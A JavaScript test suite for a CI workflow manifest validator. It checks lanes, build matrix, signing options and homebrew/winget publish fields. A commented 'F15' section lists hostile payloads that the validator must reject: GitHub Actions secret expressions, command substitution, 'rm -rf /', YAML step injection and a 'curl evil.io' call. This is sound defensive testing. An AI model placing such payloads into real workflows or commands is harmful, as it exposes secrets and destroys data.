import test from "node:test";
import assert from "node:assert/strict";
import { validateManifest } from "./manifest.mjs";

const VALID_MINIMAL = {
  schemaVersion: 1,
  lanes: ["ci"],
  matrix: { os: ["ubuntu-latest"], node: ["22.13"] },
  packageManager: "pnpm@11.24.0",
  templateVersion: "1.0.0",
};

test("accepts a minimal valid manifest", () => {
  const { valid, errors } = validateManifest(VALID_MINIMAL);
  assert.equal(valid, true);
  assert.deepEqual(errors, []);
});

test("rust-hybrid supports ci plus a configured unsigned release-candidate lane", () => {
  const valid = { ...VALID_MINIMAL, profile: "rust-hybrid", gate: { path: "scripts/gate.sh" } };
  assert.equal(validateManifest(valid).valid, true);
  for (const path of ["/tmp/gate.sh", "../gate.sh", "scripts/gate sh", "${{ secrets.X }}", "scripts/gate;sh"]) {
    assert.equal(validateManifest({ ...valid, gate: { path } }).valid, false, path);
  }
  assert.equal(validateManifest({ ...valid, lanes: ["ci", "qualification"] }).valid, false);
  const candidate = {
    ...valid,
    lanes: ["ci", "release-candidate"],
    candidate: { buildScript: "ci:candidate", checkScript: "ci:candidate-check", artifactRoot: "legion-unsigned", os: ["ubuntu-latest"] },
  };
  assert.equal(validateManifest(candidate).valid, true);
  assert.equal(validateManifest({ ...candidate, candidate: { ...candidate.candidate, signWindows: true } }).valid, false);
  assert.equal(validateManifest({ ...candidate, candidate: { ...candidate.candidate, signMacos: true } }).valid, false);
  const windowsCandidate = { ...candidate, matrix: { ...candidate.matrix, os: ["ubuntu-latest", "windows-2025"] }, candidate: { ...candidate.candidate, os: ["windows-2025"], signWindows: true } };
  assert.equal(validateManifest(windowsCandidate).valid, true);
  assert.equal(validateManifest({ ...windowsCandidate, candidate: { ...windowsCandidate.candidate, signWindows: "yes" } }).valid, false);
  const macCandidate = { ...candidate, matrix: { ...candidate.matrix, os: ["ubuntu-latest", "macos-15"] }, candidate: { ...candidate.candidate, os: ["macos-15"], signMacos: true } };
  assert.equal(validateManifest(macCandidate).valid, true);
  assert.equal(validateManifest({ ...macCandidate, candidate: { ...macCandidate.candidate, signMacos: "yes" } }).valid, false);
  assert.equal(validateManifest({ ...macCandidate, matrix: { ...macCandidate.matrix, node: ["22", "24"] } }).valid, false);
  assert.equal(validateManifest({ ...candidate, candidate: { ...candidate.candidate, buildScript: "echo unsafe" } }).valid, false);
  assert.equal(validateManifest({ ...candidate, candidate: { ...candidate.candidate, artifactRoot: "../escape" } }).valid, false);
  assert.equal(validateManifest({ ...candidate, candidate: { ...candidate.candidate, os: ["windows-latest"] } }).valid, false);

  const releaseChain = {
    ...windowsCandidate,
    candidate: {
      ...windowsCandidate.candidate,
      releaseChain: {
        windowsFinalizeScript: "release:finalize:win",
        installedQualificationScript: "release:qualify:installed",
        publishScript: "release:publish:qualified",
        qualificationRunnerVariable: "QUALIFICATION_RUNNER_LABEL",
        publishSecrets: ["CLOUDFLARE_API_TOKEN"],
      },
    },
  };
  assert.equal(validateManifest(releaseChain).valid, true);
  assert.equal(validateManifest({ ...releaseChain, candidate: { ...releaseChain.candidate, signWindows: false } }).valid, false);
  assert.equal(validateManifest({ ...releaseChain, candidate: { ...releaseChain.candidate, releaseChain: { ...releaseChain.candidate.releaseChain, publishScript: "echo unsafe" } } }).valid, false);
  assert.equal(validateManifest({ ...releaseChain, candidate: { ...releaseChain.candidate, releaseChain: { ...releaseChain.candidate.releaseChain, qualificationRunnerVariable: "${{ secrets.X }}" } } }).valid, false);
  assert.equal(validateManifest({ ...releaseChain, candidate: { ...releaseChain.candidate, releaseChain: { ...releaseChain.candidate.releaseChain, publishSecrets: ["TOKEN", "TOKEN"] } } }).valid, false);
});

test("rejects non-object input", () => {
  for (const bad of [null, undefined, "not an object", 42, ["array"]]) {
    const { valid, errors } = validateManifest(bad);
    assert.equal(valid, false);
    assert.ok(errors.length > 0);
  }
});

test("rejects an unknown top-level field", () => {
  const { valid, errors } = validateManifest({ ...VALID_MINIMAL, extra: true });
  assert.equal(valid, false);
  assert.ok(errors.some((e) => e.includes("unknown top-level field: extra")));
});

test("rejects schemaVersion other than 1", () => {
  const { valid, errors } = validateManifest({ ...VALID_MINIMAL, schemaVersion: 2 });
  assert.equal(valid, false);
  assert.ok(errors.some((e) => e.includes("schemaVersion")));
});

test("rejects an empty or unknown lane list", () => {
  assert.equal(validateManifest({ ...VALID_MINIMAL, lanes: [] }).valid, false);
  assert.equal(validateManifest({ ...VALID_MINIMAL, lanes: ["not-a-real-lane"] }).valid, false);
  assert.equal(validateManifest({ ...VALID_MINIMAL, lanes: ["ci", "ci"] }).valid, false);
});

test("rejects a malformed matrix", () => {
  assert.equal(validateManifest({ ...VALID_MINIMAL, matrix: { os: [] , node: ["22.13"] } }).valid, false);
  assert.equal(validateManifest({ ...VALID_MINIMAL, matrix: { os: ["ubuntu-latest"] } }).valid, false);
  assert.equal(validateManifest({ ...VALID_MINIMAL, matrix: "ubuntu-latest" }).valid, false);
});

test("rejects a malformed packageManager or templateVersion", () => {
  assert.equal(validateManifest({ ...VALID_MINIMAL, packageManager: "pnpm" }).valid, false);
  assert.equal(validateManifest({ ...VALID_MINIMAL, packageManager: "bun@1.0.0" }).valid, false);
  assert.equal(validateManifest({ ...VALID_MINIMAL, templateVersion: "v1" }).valid, false);
});

test("publish-npm lane requires publish.npm with oidc true", () => {
  assert.equal(validateManifest({ ...VALID_MINIMAL, lanes: ["publish-npm"] }).valid, false);
  assert.equal(
    validateManifest({ ...VALID_MINIMAL, lanes: ["publish-npm"], publish: { npm: { oidc: false, provenance: true } } }).valid,
    false,
  );
  assert.equal(
    validateManifest({ ...VALID_MINIMAL, lanes: ["publish-npm"], publish: { npm: { oidc: true, provenance: true } } }).valid,
    true,
  );
});

test("publish-package-managers lane requires both homebrew and winget config", () => {
  const base = { ...VALID_MINIMAL, lanes: ["publish-package-managers"] };
  assert.equal(validateManifest(base).valid, false);
  assert.equal(
    validateManifest({ ...base, publish: { homebrew: { tap: "acme/tap", formulaName: "widgets" } } }).valid,
    false,
  );
  assert.equal(
    validateManifest({
      ...base,
      publish: {
        homebrew: { tap: "acme/tap", formulaName: "widgets" },
        winget: { packageIdentifier: "Acme.Widgets" },
      },
    }).valid,
    true,
  );
});

test("rejects a malformed homebrew tap (must be owner/repo)", () => {
  const result = validateManifest({
    ...VALID_MINIMAL,
    lanes: ["publish-package-managers"],
    publish: {
      homebrew: { tap: "not-owner-slash-repo", formulaName: "widgets" },
      winget: { packageIdentifier: "Acme.Widgets" },
    },
  });
  assert.equal(result.valid, false);
});

// F15 fix: manifest fields (homebrew.tap, homebrew.formulaName,
// winget.packageIdentifier, matrix.os/node) flow verbatim into rendered
// workflow YAML via render.mjs's literal string substitution, which does no
// escaping. The re-validation proved a hostile `formulaName` containing
// GitHub Actions expression syntax survived into rendered output — a
// workflow-expression injection, not a cosmetic bug. Every property below
// is checked against a FAMILY of hostile payloads (expression syntax,
// command substitution, backticks, statement separators, newlines/CRLF —
// not just the report's one literal example — because a fix that only
// blocks that exact string would be exactly the failure this suite must
// catch. Each field must reject every payload in the family.
const HOSTILE_PAYLOADS = [
  "${{ secrets.APPLE_CERTIFICATE }}",
  "widgets${{secrets.X}}",
  "`whoami`",
  "$(whoami)",
  "widgets; rm -rf /",
  "widgets\nsteps:\n  - run: exit 1",
  "widgets\r\nrun: curl evil.io",
  'widgets"; secrets: ${{ secrets.X }}',
  "widgets & echo pwned",
  "widgets|echo pwned",
];

test("F15: publish.homebrew.formulaName rejects a family of injection payloads", () => {
  for (const payload of HOSTILE_PAYLOADS) {
    const result = validateManifest({
      ...VALID_MINIMAL,
      lanes: ["publish-package-managers"],
      publish: {
        homebrew: { tap: "acme/tap", formulaName: payload },
        winget: { packageIdentifier: "Acme.Widgets" },
      },
    });
    assert.equal(result.valid, false, `formulaName payload should be rejected: ${JSON.stringify(payload)}`);
  }
});

test("F15: publish.homebrew.tap rejects a family of injection payloads", () => {
  for (const payload of HOSTILE_PAYLOADS) {
    const result = validateManifest({
      ...VALID_MINIMAL,
      lanes: ["publish-package-managers"],
      publish: {
        homebrew: { tap: `acme/${payload}`, formulaName: "widgets" },
        winget: { packageIdentifier: "Acme.Widgets" },
      },
    });
    assert.equal(result.valid, false, `tap payload should be rejected: ${JSON.stringify(payload)}`);
  }
});

test("F15: publish.winget.packageIdentifier rejects a family of injection payloads", () => {
  for (const payload of HOSTILE_PAYLOADS) {
    const result = validateManifest({
      ...VALID_MINIMAL,
      lanes: ["publish-package-managers"],
      publish: {
        homebrew: { tap: "acme/tap", formulaName: "widgets" },
        winget: { packageIdentifier: payload },
      },
    });
    assert.equal(result.valid, false, `winget packageIdentifier payload should be rejected: ${JSON.stringify(payload)}`);
  }
});

test("F15: matrix.os and matrix.node reject a family of injection payloads", () => {
  for (const payload of HOSTILE_PAYLOADS) {
    assert.equal(
      validateManifest({ ...VALID_MINIMAL, matrix: { os: [payload], node: ["22.13"] } }).valid,
      false,
      `matrix.os payload should be rejected: ${JSON.stringify(payload)}`,
    );
    assert.equal(
      validateManifest({ ...VALID_MINIMAL, matrix: { os: ["ubuntu-latest"], node: [payload] } }).valid,
      false,
      `matrix.node payload should be rejected: ${JSON.stringify(payload)}`,
    );
  }
});

// Non-regression: realistic, legitimate values using the characters real
// GitHub/Homebrew/WinGet identifiers and runner/version labels actually use
// must keep passing — the allowlist must not be so strict it breaks normal
// configuration.
test("F15 non-regression: realistic homebrew/winget/matrix values still validate", () => {
  const result = validateManifest({
    ...VALID_MINIMAL,
    lanes: ["publish-package-managers"],
    matrix: { os: ["ubuntu-latest", "self-hosted-linux"], node: ["22.13", "lts/*", "20.x"] },
    publish: {
      homebrew: { tap: "acme-inc/homebrew-tap", formulaName: "widgets++" },
      winget: { packageIdentifier: "Acme.Widgets.Beta" },
    },
  });
  assert.equal(result.valid, true, JSON.stringify(result.errors));
});
